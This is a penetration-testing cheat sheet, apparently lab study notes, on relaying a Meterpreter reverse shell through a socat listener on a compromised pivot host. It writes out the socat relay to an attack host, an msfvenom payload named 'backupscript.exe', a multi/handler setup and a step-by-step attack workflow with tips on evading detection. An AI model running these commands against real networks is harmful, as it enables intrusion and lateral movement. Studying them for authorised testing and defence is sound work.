
# 🛰️ Socat Redirection with a Reverse Shell Cheat Sheet

> [!info] 🧠 What is Socat Redirection?
> 
> Bash
> 
> ```
> Standalone, bidirectional relay technique that maps independent raw network communication channels directly together without requiring an SSH server layer or an active Metasploit framework agent.
> ```
> 
> 💡 Allows administrators and penetration testers to:
> 
> - **Build Standalone Tunnels:** Establish robust network relays using standard native utilities pre-installed on modern Linux frameworks.
>     
> - **Evade Core Detection:** Avoid maintaining loud, persistent interactive SSH login sessions or heavy agent payloads on a pivot host.
>     
> - **Simplify Connection Chains:** Bridge network boundaries by dynamically transforming a compromised host into a blind traffic reflector.
>     
> 
> ✔ Common in:
> 
> - Firewalled reverse infrastructure setups, automated red team command-and-control (C2) forwarding arrays, and tactical perimeter evasion.
>     

> [!tip] 🔧 Core Idea
> 
> Bash
> 
> ```
> Isolated Target (Payload Execution) ↔ Compromised Pivot (Socat Relay) ↔ Attack Host Listener
> ```
> 
> 💡 Key Operational Nodes:
> 
> - **The External Gateway:** Your Attack Host (`10.10.14.18`) holds open a standard framework listener.
>     
> - **The Inward Bridge:** The Windows Target (`172.16.5.19`) can only connect out to adjacent subnet resources managed by the Ubuntu Server (`172.16.5.129`).
>     
> 
> ✔ Think of it as **splicing a piece of physical network cable inside the pivot host. Socat listens blindly on one local port and instantly links any incoming connection right to your external attack handler like a hollow pipe**.

# 🌳 Structure: Listener Routing & Payload Delivery

> [!info] 📚 Staging the Pivot Listener (`socat`)
> 
> Bash
> 
> ```
> socat TCP4-LISTEN:<Pivot_Port>,fork TCP4:<Attack_Host_IP>:<Attack_Host_Port>
> ```
> 
> 💡 Function:
> 
> - Tells the compromised intermediate system to hold a listener socket open and dynamically mirror any incoming TCP strings out to the external handler infrastructure.
>     

> [!tip] 📥 Targeting the Relay Interface (`msfvenom`)
> 
> Bash
> 
> ```
> msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<Pivot_Internal_IP> LPORT=<Pivot_Port> -f exe -o backupscript.exe
> ```
> 
> 💡 Logic:
> 
> - Configures the target's executable payload to look for an acceptable local connection pathway, masking your true external attack footprint entirely from internal firewall logging.
>     

# 🔐 Access Methods

|**Connection Segment**|**Initiating Device**|**Target Endpoint & Port**|**Operational Purpose**|
|---|---|---|---|
|**Payload Launch**|Isolated Endpoint (`172.16.5.19`)|`172.16.5.129:8080` (Pivot Interface)|Triggers an allowed internal connection to the trusted pivot server.|
|**Redirection Pipe**|Compromised Host (`10.129.202.64`)|`10.10.14.18:80` (Attack Host Interface)|Socat intercepts the incoming packet stream and routes it safely across network boundaries.|
|**Shell Capture**|Attack Machine (`10.10.14.18`)|`0.0.0.0:80` (Metasploit Handler)|Catches the forwarded stream coming out of the relay pipe to generate an active interactive shell.|

# 🔍 Footprinting & Enumeration

> [!success] 📡 Validating the Redirection Environment
> 
> Bash
> 
> ```
> # 1. Launch the standalone Socat listener in the background of the compromised host
> ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80 &
>  
> # 2. Confirm the Socat socket is actively listening on the pivot architecture
> ubuntu@Webserver:~$ netstat -antp | grep 8080
> # Expected: tcp  0  0 0.0.0.0:8080  0.0.0.0:* LISTEN  <PID>/socat
> ```
> 
> 💡 Flag breakdown & structural parameters:
> 
> - `TCP4-LISTEN:8080` establishes an open IPv4 network capture port on the pivot machine.
>     
> - `fork` **(Critical Operational Parameter):** Instructs Socat to spawn an independent sub-process for every fresh connection attempt. This keeps the parent listener alive so you can establish multiple independent shells without crashing the pivot.
>     

> [!info] 🔍 Information Revealed
> 
> - **Source Masking:** When the connection drops into your local Metasploit multi/handler, the staging connection profile lists the source as the pivot machine's external interface address (`10.129.202.64`), proving the proxy layer is working.
>     
> - **Domain Environment Access:** Successful execution yields immediate systemic validation commands (`getuid`), proving your localized terminal now possesses full interaction rights on the internal domain network structure.
>     

# ⚠️ Common Misconfigurations

> [!danger] 🔓 Port Binding Collisions & Omitted Fork Parameters
> 
> Bash
> 
> ```
> Port Availability Clash: Running Socat on a port already actively consumed by local web services (e.g., Port 80/8080)
> Single-Execution Drops: Running the Socat command stream without adding the 'fork' condition flag
> ```
> 
> 💡 Impact:
> 
> - **Service Conflicts:** If the chosen port is already listening on the host (like an active Apache/Nginx web server), Socat will immediately fail to bind, outputting an `Address already in use` error.
>     
> - **Immediate Shell Dropouts:** Without the `fork` flag, Socat kills its entire active engine the moment a single connection stream drops or closes, cutting off any subsequent lateral deployment pathways.
>     

# 💥 Protocol-Specific Attacks

> [!warning] ⚙️ Tuning the Framework Multi/Handler
> 
> Bash
> 
> ```
> msf6 > use exploit/multi/handler
> msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
> msf6 exploit(multi/handler) > set lhost 0.0.0.0
> msf6 exploit(multi/handler) > set lport 80
> msf6 exploit(multi/handler) > run
> ```
> 
> 💡 Impact:
> 
> - Deploys a listener on your attack box set to process incoming HTTPS encrypted payloads hitting port `80`.
>     
> - **Infrastructure Tip:** Using standard service ports like 80 (HTTP) or 443 (HTTPS) helps the outbound Socat relay blend in with legitimate web traffic leaving the network.
>     

# ⚡ Real-World Workflow

> [!success] 🧠 Attack Flow
> 
> Bash
> 
> ```
> 1. Compromise an internet-facing host and verify it has the 'socat' utility package compiled on its filesystem.
> 2. Spin up a local Metasploit multi/handler on your attack computer, binding it to listen on a common port (e.g., port 80).
> 3. Start the Socat redirector on the pivot system, telling it to listen on port 8080 and fork any traffic out to your machine's port 80.
> 4. Use msfvenom to build a target executable that targets the pivot server's internal network IP address on port 8080.
> 5. Upload the executable payload to the isolated host using existing lateral movement scripts.
> 6. Run the payload on the internal asset; Socat automatically mirrors the traffic across the boundary to spawn your shell.
> ```
> 
> 💡 Always review your attack architecture's local port allowances; if your attack box is running its own local web services on port 80, stop them before starting your multi/handler.

# 🧩 Mental Model

> [!quote] 🎯 Protocol Hierarchy
> 
> Bash
> 
> ```
> msfvenom Payload     → A traveler looking to cross borders by visiting the nearest local terminal node
> Socat Listener       → A turnstile that automatically redirects anyone who enters straight onto a matching high-speed rail
> fork Argument        → Keeping the turnstile unlocked so multiple travelers can cross the line at once
> Metasploit Handler   → The reception desk welcoming the traveler at the final train station destination
> ```
> 
> 💡 When dropping agents or modifying SSH system profiles is too risky, deploy Socat. It sets up a quick, clean network relay that drops right out of memory the moment you kill the process.